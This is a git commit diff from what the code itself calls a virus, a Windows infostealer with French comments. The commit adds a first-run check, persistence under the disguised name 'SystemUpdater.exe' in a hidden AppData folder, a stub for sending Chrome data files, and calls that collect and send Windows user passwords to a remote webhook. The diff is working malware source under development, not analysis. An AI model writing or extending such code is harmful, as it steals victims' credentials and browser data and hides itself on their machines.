89f5cadd43467f058eea9574cbf2887b5f70681f
endelf <93210351+endelf@users.noreply.github.com>
2024-09-18 18:56:40 +0200

    Persistance + Vérification si 1er execution

---
+++ src/chrome_data.c
@@ -0,0 +1,8 @@
+#include <sdtio.h>
+
+#include "../include/http.h"
+#include "../include/structures.h"
+
+void send_chrome_data_files(COMPUTER_INFOS *cmp_info){
+
+}
--- src/main.c
+++ src/main.c
@@ -1,10 +1,12 @@
 #include <stdio.h>
 #include <string.h>
+#include <windows.h>
+#include <io.h>
 
 #include "computer_informations.c"
 #include "windows_users_passwords.c"
-#include "autostart.c"
-//#include "persistance.c"
+//#include "autostart.c"
+#include "persistance.c"
 
 #include "../include/http.h"
 #include "../include/structures.h"
@@ -22,42 +24,54 @@ src/windows_users_passwords:
     -save_and_send_windows_users_password(COMPUTER_INFOS *cmp_info)
 */
 
-int is_first_execution(){
-    
-    /*Fonction à coder pour éviter de recréer le dossier du virus et sa persistance vue qu'il s'execute au démarage*/
 
-    return 0; // ou return 1
+
+
+int is_first_execution(char *current_executable_path, char *softwareDataDirectory, char* fake_executable_name) {
+
+    /*Vérifier que c'est la première execution en regardant si le le la faux executable du logiciel existe déja */
+
+    char fake_executable_path[256];
+    snprintf(fake_executable_path, 256, "%s\\%s", softwareDataDirectory, fake_executable_name);
+    return _access(fake_executable_path, 0); // de io.h
+
 };
 
 int main(void){
 
-    char executable_name[] = "main.exe";
+    char fake_executable_name[] = "SystemUpdater.exe";
+
+    char current_executable_path[MAX_PATH];
+    GetModuleFileName(NULL, current_executable_path, MAX_PATH);
 
     COMPUTER_INFOS computer;
     get_computer_info(&computer);
 
-    // je créer le dossier du logiciel
     char softwareDataDirectory[1024];
     snprintf(softwareDataDirectory, 1024, "C:\\Users\\%s\\AppData\\Local\\G666", computer.username);
-    CreateDirectory(softwareDataDirectory, NULL);
 
-    /* faire en sorte que le virus s'execute à tous les démarage du pc
-    set_persistance(softwareDataDirectory, executable_name); pas encore opérationnel*/
+    if(is_first_execution(current_executable_path, softwareDataDirectory, fake_executable_name)){
+        // je créer le dossier du logiciel
+        CreateDirectory(softwareDataDirectory, NULL);
+        set_persistance(softwareDataDirectory, current_executable_path, fake_executable_name); //fonction à amméliorer pour que si refus des droits admin, dossier de démarage simplement
+    
+        // C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp // dossier de démarrage de windows
 
-    // C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp // dossier de démarrage de windows
+        /*// Chemin du répertoire du logiciel et nom de l'exécutable
+        const char *repertoireLogiciel = "C:\\Users\\%s\\AppData\\Local\\G666";
+        const char *nomExecutable = "main.exe";
+        add_winstart(repertoireLogiciel, nomExecutable);*/
 
-    /*// Chemin du répertoire du logiciel et nom de l'exécutable
-    const char *repertoireLogiciel = "C:\\Users\\%s\\AppData\\Local\\G666";
-    const char *nomExecutable = "main.exe";
-    add_winstart(repertoireLogiciel, nomExecutable);*/
+        save_and_send_windows_users_password(&computer);
+    
+    }
 
     printf("\nComputer Name: %s\n", computer.computer_name);
     printf("Username: %s\n", computer.username);
     printf("Windows Version: %s\n", computer.windows_version);
     printf("Architecture: %s\n\n", computer.architecture);
 
-
     send_to_server("/webhook/client.php", "{\"client_id\":1}");
-    save_and_send_windows_users_password(&computer);
+    
     return 0;
 }
